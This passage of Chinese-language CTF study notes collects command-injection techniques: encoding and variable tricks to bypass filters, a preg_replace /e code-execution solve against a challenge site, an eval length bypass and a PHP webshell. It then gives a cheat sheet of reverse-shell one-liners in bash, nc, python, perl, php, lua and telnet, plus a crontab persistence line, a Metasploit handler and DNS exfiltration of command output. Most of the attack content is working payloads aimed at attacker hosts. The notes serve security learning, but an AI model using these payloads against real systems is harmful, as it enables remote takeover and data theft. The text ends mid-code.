<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">方法一  -d|sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"d2hvYW1p"</span>|base64 -d                回显whoami</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"d2hvYW1p"</span>|base64 -d|sh              回显root  whoami被执行</span><br><span class="line"></span><br><span class="line">?cmd=<span class="built_in">echo</span> <span class="string">"bHM="</span>|base64 -d|bash            执行ls </span><br><span class="line"></span><br><span class="line">方法二  -d 不用sh执行 再用``反引号包裹执行   漂亮</span><br><span class="line"></span><br><span class="line">`<span class="built_in">echo</span> <span class="string">"Y2F0IGZsYWc="</span>|base64 -d`                cat flag</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Y2F0IGZsYWc="</span>|base64 -d|bash</span><br><span class="line">方法三  $(<span class="built_in">command</span>)</span><br><span class="line">$(<span class="built_in">echo</span> <span class="string">"Y2F0IGZsYWc="</span>|base64 -d)</span><br></pre></td></tr></table></figure>

<h3 id="hex编码"><a href="#hex编码" class="headerlink" title="hex编码"></a>hex编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"636174202f666c6167"</span> | xxd -r -p|bash               ==&gt;cat /flag</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"63617420666c6167"</span> | xxd -r -p|bash               ==&gt;cat flag</span><br><span class="line">同样的 </span><br><span class="line">方法二</span><br><span class="line">`<span class="built_in">echo</span> <span class="string">"63617420666c6167"</span> | xxd -r -p`</span><br><span class="line">方法三</span><br><span class="line">$(<span class="built_in">echo</span> <span class="string">"63617420666c6167"</span> | xxd -r -p)</span><br></pre></td></tr></table></figure>

<h3 id="oct编码"><a href="#oct编码" class="headerlink" title="oct编码"></a>oct编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">"\154\163"</span>)                   ==&gt;ls</span><br><span class="line">方法二</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"\154\163"</span>  -d|sh</span><br><span class="line">方法三</span><br><span class="line">`<span class="built_in">printf</span> <span class="string">"\154\163"</span>`</span><br><span class="line"></span><br><span class="line">$(cat /flag)</span><br><span class="line"><span class="comment">#虽然$()可以有以上用法，$()带有参数的编码命令不可以执行</span></span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span>)              ==&gt;cat /flag      可以</span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span>&#125;|<span class="variable">$0</span>              ==&gt;cat /flag         不行  凡是带有&#123;&#125;|<span class="variable">$0</span>都没有试成功</span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x66\x6c\x61\x67"</span>)                    ==&gt;cat flag</span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">"\x63\x61\x74\x20\x66\x6c\x61\x67"</span>&#125;|<span class="variable">$0</span>                ==&gt;cat flag</span><br><span class="line"><span class="comment">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST['c']);?&gt;</span></span><br><span class="line"><span class="variable">$&#123;printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"&#125;</span> &gt;&gt; 1.php  不成功</span><br></pre></td></tr></table></figure>

<h3 id="字符串拼接-变量绕过"><a href="#字符串拼接-变量绕过" class="headerlink" title="字符串拼接  变量绕过"></a>字符串拼接  变量绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">a=c;b=at;c=flag;<span class="variable">$a</span><span class="variable">$b</span> <span class="variable">$c</span>        ==&gt;cat flag</span><br><span class="line">cat hello文件内容：        a=c;b=at;c=he;d=llo;<span class="variable">$a</span><span class="variable">$b</span> <span class="variable">$&#123;c&#125;</span><span class="variable">$&#123;d&#125;</span></span><br><span class="line">a=c;b=at;c=f;d=lag;<span class="variable">$a</span><span class="variable">$b</span> <span class="variable">$&#123;c&#125;</span><span class="variable">$&#123;d&#125;</span>               ==&gt;cat flag</span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line">未初始化的变量值都是null</span><br><span class="line">读取/etc/passwd：</span><br><span class="line">cat<span class="variable">$a</span> /etc<span class="variable">$a</span>/passwd<span class="variable">$a</span></span><br><span class="line">cat<span class="variable">$a</span> flag<span class="variable">$a</span></span><br><span class="line"></span><br><span class="line">方法三 没看懂 要记住</span><br><span class="line">?kg=$<span class="string">'\x20flag.txt'</span>&amp;&amp;cat<span class="variable">$kg</span>  (不需要php环境)</span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br><span class="line">&#123;cat flag.txt&#125;</span><br></pre></td></tr></table></figure>

<h3 id="借他人之手来获取字符-env-调用环境变量中有的字符"><a href="#借他人之手来获取字符-env-调用环境变量中有的字符" class="headerlink" title="借他人之手来获取字符   env  调用环境变量中有的字符"></a>借他人之手来获取字符   env  调用环境变量中有的字符</h3><ul>
<li>?cmd=cat <code>ls</code> </li>
</ul>
<p>两个条件</p>
<p>– 没有过滤<code>$</code>,和<code>{</code>,<code>}</code></p>
<p>– 环境变量中得有啊</p>
<ul>
<li>如果过滤了<strong>&lt;&gt;?</strong>，可以从已有的文件或环境变量中获取自己需要的字符。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如获取 &lt; 符 -- </span><br><span class="line"><span class="built_in">echo</span> `expr substr $(awk NR==1 test.php) 1 1`         不行</span><br></pre></td></tr></table></figure>

<ul>
<li>过滤斜杠/     </li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">用PATH的斜杠</span><br><span class="line">cat<span class="variable">$&#123;IFS&#125;</span><span class="variable">$&#123;PATH:0:1&#125;</span>etc<span class="variable">$&#123;PATH:0:1&#125;</span>passwd</span><br><span class="line"><span class="variable">$&#123;PATH:0:1&#125;</span>   ==&gt;   /</span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line">expr substr <span class="variable">$PWD</span> 1 1                   (输出为)/</span><br></pre></td></tr></table></figure>

<h3 id="难绕的正则匹配"><a href="#难绕的正则匹配" class="headerlink" title="难绕的正则匹配"></a>难绕的正则匹配</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/.*f.*l.*a.*g.*/   完全不行 只能利用`ls`先执行来获得本目录下所有文件名    a=g;ta\c<span class="variable">$IFS</span><span class="variable">$9fla</span><span class="variable">$a</span>.php可以</span><br><span class="line">/tac|rm|<span class="built_in">echo</span>|cat|nl|less|more|tail|head/  黑名单还行  类似一次替换的preg_replace  cAt大写肯定不行 ccatat双写也不行  ca\t</span><br><span class="line"></span><br><span class="line">ta\c<span class="variable">$IFS</span><span class="variable">$9</span>`ls`  能爆 但</span><br><span class="line">ca\t<span class="variable">$IFS</span><span class="variable">$9</span>`ls`   不行</span><br></pre></td></tr></table></figure>

<h4 id="例-preg-replace-e-模式"><a href="#例-preg-replace-e-模式" class="headerlink" title="例  preg_replace /e 模式"></a>例  preg_replace <strong>/e</strong> 模式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,            这个本来不可控  可控的是 $re和  $str</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;              file=<span class="number">123</span>    ===&gt;   re=file  str=<span class="number">123</span></span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//9e204bf4-1b3d-4465-ac8c-cbd080b57430.node3.buuoj.cn/next.php?\S*=$&#123;phpinfo()&#125; </span></span><br><span class="line">?.*=$&#123;phpinfo()&#125;             .*在php中会被转化成_*    而且.在php中是连接符   对于传入的非法的 $_GET 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。我们可以 fuzz 一下PHP会将哪些符号替换成下划线，发现有：（这是非法字符不为首字母的情况）</span><br><span class="line">?\S*=$&#123;phpinfo()&#125;                所以用\S*    匹配所有字符</span><br><span class="line"> preg_replace(<span class="string">'/('</span> . $re . <span class="string">')/ei'</span>, <span class="string">'strtolower("\\1")'</span>,  $str);</span><br><span class="line"> preg_replace(<span class="string">'/( \S* )/ei'</span>, <span class="string">'strtolower("\\1")'</span>,  $&#123;phpinfo()&#125;   );    </span><br><span class="line">			preg_replace在 $&#123;phpinfo()&#125; 中匹配 \S* ，即还是 $&#123;phpinfo()&#125; </span><br><span class="line">			  \\<span class="number">1</span>           \\<span class="number">1</span> 实际上就是 \<span class="number">1</span></span><br><span class="line">            $&#123;phpinfo()&#125; 然后第一个</span><br><span class="line">            strtolower(<span class="string">""</span>) 转化成小写 命令执行</span><br><span class="line">http:<span class="comment">//9e204bf4-1b3d-4465-ac8c-cbd080b57430.node3.buuoj.cn/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system('whoami');</span></span><br><span class="line">			cmd=system(<span class="string">'whoami'</span>);           记住分号别忘了 忘了就执行不了</span><br><span class="line">            cmd=system(<span class="string">'ls'</span>)</span><br><span class="line">            cmd=system(<span class="string">'cat  /flag'</span>);             @<span class="keyword">eval</span>(system(<span class="string">'cat  /flag'</span>));  <span class="keyword">echo</span> <span class="keyword">eval</span>(system(<span class="string">'whoami'</span>));</span><br><span class="line">http:<span class="comment">//9e204bf4-1b3d-4465-ac8c-cbd080b57430.node3.buuoj.cn/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system('cat  /flag');</span></span><br><span class="line"></span><br><span class="line">直接连蚁剑也行 </span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'zhiliya'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//9e204bf4-1b3d-4465-ac8c-cbd080b57430.node3.buuoj.cn/next.php?\S*=$&#123;phpinfo()&#125; </span></span><br><span class="line">http:<span class="comment">//9e204bf4-1b3d-4465-ac8c-cbd080b57430.node3.buuoj.cn/next.php?\S*=$&#123;eval($_POST[zhiliya])&#125;    可以</span></span><br><span class="line">?\S*=$&#123;phpinfo()&#125; </span><br><span class="line">?\S*=$&#123;system(<span class="string">'whoami'</span>);)&#125; </span><br><span class="line">?\S*=$&#123;<span class="keyword">eval</span>($_POST[zhiliya])&#125;                                                <span class="keyword">eval</span>(<span class="keyword">eval</span>($_POST[zhiliya]))</span><br><span class="line">?\S*=$&#123;<span class="keyword">eval</span>($_POST[<span class="string">'zhiliya'</span>])&#125; 不行 不能有<span class="string">''</span>  连接时返回数据为空</span><br></pre></td></tr></table></figure>

<h4 id="例-传参长度有限制的题"><a href="#例-传参长度有限制的题" class="headerlink" title="例  传参长度有限制的题"></a>例  传参长度有限制的题</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $param = $_POST[<span class="string">'param'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($param) &lt; <span class="number">17</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>($param);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>(phpinfo());</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>(system(<span class="string">'whoami'</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="keyword">eval</span>($_POST[zhiliya]))</span><br><span class="line">POST:  </span><br><span class="line">param=<span class="keyword">eval</span>($_POST[zhiliya]);&amp;zhiliya=<span class="keyword">echo</span> <span class="keyword">eval</span>(system(<span class="string">'whoami'</span>));</span><br><span class="line">缩</span><br><span class="line">param=<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="keyword">echo</span>  <span class="keyword">eval</span>(system(<span class="string">'whoami'</span>));</span><br><span class="line">缩</span><br><span class="line">param=<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="keyword">echo</span> system(<span class="string">'whoami'</span>); <span class="keyword">eval</span>其实是多余的</span><br><span class="line">缩</span><br><span class="line">param=<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="keyword">echo</span> `whoami`;        ` `用反引号包裹就可执行</span><br></pre></td></tr></table></figure>

<p>很简单，长度不能大于等于17，直接在eval里面再用一个eval就可以了。<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20190120211733-bf383cdc-1cb5-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120211733-bf383cdc-1cb5-1.png" alt="img"></a></p>
<h1 id="没有回显"><a href="#没有回显" class="headerlink" title="没有回显"></a>没有回显</h1><p>比如sql，xxe，xss等等，这个时候一般可以用dns/http通道来获取数据。</p>
<h2 id="第一种利用vps，用nc进行弹shell-反弹shell"><a href="#第一种利用vps，用nc进行弹shell-反弹shell" class="headerlink" title="第一种利用vps，用nc进行弹shell  反弹shell"></a>第一种利用vps，用nc进行弹shell  反弹shell</h2><p>是利用bash命令并在本地进行nc监听结果查看回连日志，然后就行</p>
<p>先在vps处用nc进行监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 8080 -vvv</span><br><span class="line">nc -lvvp 7777 -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>然后在靶机命令执行处输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0&gt;&amp;1</span><br><span class="line"><span class="string">"&amp;"</span> 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。</span><br><span class="line">靶机：</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackip attackport &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<p>![image-20200730143353715](6 命令执行/image-20200730143353715.png)    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">bash方式</span><br><span class="line">$ bash -c <span class="string">"sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>方式</span><br><span class="line">$ <span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/ip/port</span><br><span class="line"></span><br><span class="line">$ cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">nc方式</span><br><span class="line">本机运行:</span><br><span class="line">nc -l -vv -p port</span><br><span class="line">目标主机:</span><br><span class="line">nc -e /bin/bash ip port</span><br><span class="line"></span><br><span class="line">python方式</span><br><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line"></span><br><span class="line">另一种：</span><br><span class="line">  python -c <span class="string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('ip',port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span></span><br><span class="line"></span><br><span class="line">Perl方式</span><br><span class="line">perl -e <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br><span class="line"></span><br><span class="line">php方式</span><br><span class="line">php -r <span class="string">'$sock=fsockopen("ip",port);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br><span class="line"></span><br><span class="line">lua方式</span><br><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('ip','port');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br><span class="line"><span class="comment">#需要lua socket支持，且lua5.2+不支持luasocket</span></span><br><span class="line"></span><br><span class="line">crontab方式</span><br><span class="line">crontab -e编辑当前用户的任务，或者是写到计划任务目录，一般是 /var/spool/cron/ 目录，ubuntu是</span><br><span class="line">/var/spool/cron/crontabs。文件名为用户名root等。下面命令含义是每一分钟执行一次反弹shell命令。</span><br><span class="line"></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line"></span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">telnet方式</span><br><span class="line">mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $cmd = $_POST[<span class="string">'c'</span>];</span><br><span class="line">        exec(<span class="string">'ps -aux | grep '</span>.$cmd, $result);</span><br><span class="line">        <span class="keyword">foreach</span>($result <span class="keyword">as</span> $k)&#123;</span><br><span class="line">                <span class="keyword">if</span>(strpos($k, $cmd))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> $k.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>既然无法根据回显判断命令是否执行，那还可通过linux下的sleep命令测试是否执行：<strong>c=123 ; sleep 5</strong>，产生了延时，说明命令执行了</p>
<p>然后测试下它是否能连接外网：<strong>c=123 ; ping <a href="http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a></strong>，浏览器一直转圈圈的话就是ping执行了，能连外网。<br>然后就好弄了，有个公网ip再用个反弹shell的姿势：<strong>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</strong> 就能getshell了。</p>
<h3 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h3><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>检测NC：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;n&#39;c</span><br></pre></td></tr></table></figure>

<p><a href="https://image.3001.net/images/20180921/1537502861_5ba46e8d4ba6b.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502861_5ba46e8d4ba6b.png!small" alt="检测NC"></a></p>
<p>没有NC的情况检查wget：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;w&#39;g&#39;e&#39;t</span><br></pre></td></tr></table></figure>

<p><a href="https://image.3001.net/images/20180921/1537502866_5ba46e92406de.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502866_5ba46e92406de.png!small" alt="没有NC的情况检查wget"></a></p>
<p>简单粗暴（容易被检查）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#39;sh -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;2130706433&#x2F;3737 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure>



<h2 id="第二种是msf反向回连"><a href="#第二种是msf反向回连" class="headerlink" title="第二种是msf反向回连"></a>第二种是msf反向回连</h2><p>同样vps用msf监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vps的msf监听：</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/armle/shell/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lport 8080</span><br><span class="line"><span class="built_in">set</span> lhost xxx.xxx.xxx.xxx</span><br><span class="line"><span class="built_in">set</span> exitonsession <span class="literal">false</span></span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>

<p>然后在靶机命令执行处输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0&gt;&amp;1</span><br><span class="line">192.168.217.141:32786/?c=123;bash -i &gt;&amp; /dev/tcp/192.168.217.161/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>即可getflag</p>
<h2 id="第三种是利用DNS管道解析"><a href="#第三种是利用DNS管道解析" class="headerlink" title="第三种是利用DNS管道解析"></a>第三种是利用DNS管道解析</h2><p>这里提供一个在线网址，可以直接进行给一个利用网址：<a href="https://www.freebuf.com/articles/web/admin.dnslog.link" target="_blank" rel="noopener">admin.dnslog.link</a>注册一个账号后会分配一个子域名可以利用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|curl `whoami`.xxxx.xxx(子域名)</span><br></pre></td></tr></table></figure>

<p>这样就会在利用网址看到反弹结果。（这里也不演示了，账号忘记了。。。）这里解释一下<code>\</code>whoami<code>\</code>因为`反引号在linux下是执行命令的特殊符号，原理请见：<a href="http://mp.weixin.qq.com/s/jwqWnP0FHhMoR5b6iCS6NQ" target="_blank" rel="noopener">http://mp.weixin.qq.com/s/jwqWnP0FHhMoR5b6iCS6NQ</a></p>
<h1 id="无参数RCE-R"><a href="#无参数RCE-R" class="headerlink" title="无参数RCE (?R)?"></a>无参数RCE (?R)?</h1><p>![image-20200730160028582](6 命令执行/image-20200730160028582.png)</p>
<p>![image-20200730160104523](6 命令执行/image-20200730160104523.png)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">et file_get_contents</span><br><span class="line">同类函数</span><br><span class="line">readfile</span><br><span class="line">show_source</span><br><span class="line">highlight_file</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">我们想构造?exp=scandir(<span class="string">'.'</span>)来获取当前目录</span><br><span class="line"></span><br><span class="line">那这个.我们该如何构造</span><br><span class="line"></span><br><span class="line">这里要引入current(localeconv())或者current(localeconv())</span><br><span 